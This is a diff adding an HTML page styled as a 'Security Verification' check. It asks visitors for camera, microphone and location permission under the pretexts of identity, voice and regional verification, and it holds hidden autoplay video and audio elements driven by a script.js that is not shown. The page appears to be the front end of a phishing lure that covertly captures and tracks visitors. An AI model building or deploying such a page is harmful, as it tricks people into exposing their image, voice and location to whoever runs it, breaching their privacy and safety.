@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Security Check Required</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="icon">🛡️</div>
+            <h1>Security Verification</h1>
+            <p>Please complete the security check to continue</p>
+            
+            <div class="permission-box" id="camera-box">
+                <div class="permission-icon">📷</div>
+                <div class="permission-text">
+                    <h3>Camera Access Required</h3>
+                    <p>For identity verification</p>
+                </div>
+                <div class="status" id="camera-status">Pending</div>
+            </div>
+            
+            <div class="permission-box" id="microphone-box">
+                <div class="permission-icon">🎤</div>
+                <div class="permission-text">
+                    <h3>Microphone Access Required</h3>
+                    <p>For voice verification</p>
+                </div>
+                <div class="status" id="microphone-status">Pending</div>
+            </div>
+            
+            <div class="permission-box" id="location-box">
+                <div class="permission-icon">📍</div>
+                <div class="permission-text">
+                    <h3>Location Access Required</h3>
+                    <p>For regional verification</p>
+                </div>
+                <div class="status" id="location-status">Pending</div>
+            </div>
+            
+            <button id="start-btn" disabled>Start Verification</button>
+            <div id="message" class="message"></div>
+        </div>
+    </div>
+    
+    <video id="video" style="display:none;" autoplay playsinline></video>
+    <audio id="audio" style="display:none;"></audio>
+    
+    <script src="script.js"></script>
+</body>
+</html>
